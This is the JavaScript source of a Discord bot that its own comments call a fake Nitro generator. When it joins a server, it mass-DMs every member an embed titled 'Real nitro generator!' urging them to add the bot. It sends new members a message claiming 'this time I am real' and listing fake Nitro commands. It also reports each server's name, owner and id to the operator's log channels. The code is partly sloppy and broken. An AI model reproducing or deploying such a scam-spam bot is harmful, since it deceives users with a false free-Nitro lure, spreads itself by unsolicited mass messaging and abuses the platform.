// Package's \\
const dmall = require("discord.js")       
const DarkDevs = new dmall.Client()

// Config's \\
const dmconfig = require('./dmconfig.json') 
const token = dmconfig.token;
const Serverinvite = dmconfig.serverinvite;
const status = dmconfig.status;
const prefix = dmconfig.prefix;
const JoinLogID = dmconfig.joinlog;
const leavelogID = dmconfig.leavelog; 
DarkDevs.login(token)

// Server join's Log \\
DarkDevs.on('guildCreate', guild => {
DarkDevs.channels.get(JoinLogID).send(`**DMAll joined a new server!
Server Details/
Server name: __${guild.name}__
Server owner: __${guild.owner}__
Server id: __${guild.id}__
Server Count: __${guild.memberCount}__**`)
});
// Server join's Log \\
DarkDevs.on('guildDelete', guild => {
  DarkDevs.channels.get(leavelogID).send(`**DMAll Left a server!
Server name: __${guild.name}__
Server owner: __${guild.owner}__
Server id: __${guild.id}__
Server Count: __${guild.memberCount}__**`)

}); 
// Now we need when bot join aguild dm every body in it eh ok
DarkDevs.on('guildCreate', guild => {
    DarkDevs.guilds.forEach(g => {
  guild.send("Join Test") // we need away to fatch member's. wait
      guild.members.forEach(members => {
                 const embed = new dmall.RichEmbed() 
                 embed.setColor("#0e92eb")
                 embed.setTitle("Real nitro generator!")
                 embed.setDescription("Add me to your server")
                    members.send(embed); /// we should make it amessage. like add bot i got cmd to dmall all user's leater
                })
    });
});
const fmessage = "2020 | New No fake";
  DarkDevs.on('guildMemberAdd', member => { 
        member.send(`${member}`);
        let embed = new dmall.RichEmbed()
    .setDescription(`[Invite Link]()

Hello i am new discord Bot For Generatoring. Nitro
But This Time I am real!
Commands:
!invite
!stock
!nitro-classic
!nitro-boost
!help (shows help msg)
            *** Add Me Today***


`)
  
    embed.setFooter(fmessage)
    member.send(embed).then(m => {
      m.react("")
      
    })
                                          });
// Fake Gen Commands \\ 
//haha hahaha
// :thinking: 
DarkDevs.on("message", message => {
  if (message.content.includes(prefix + "help")) {
  let help = new dmall.RichEmbed()
  .setDescription(`




`)
  message.channel.send(`Check Dm!`)
  message.react(':white_mark_')
  message.author.send(help)
}
});


 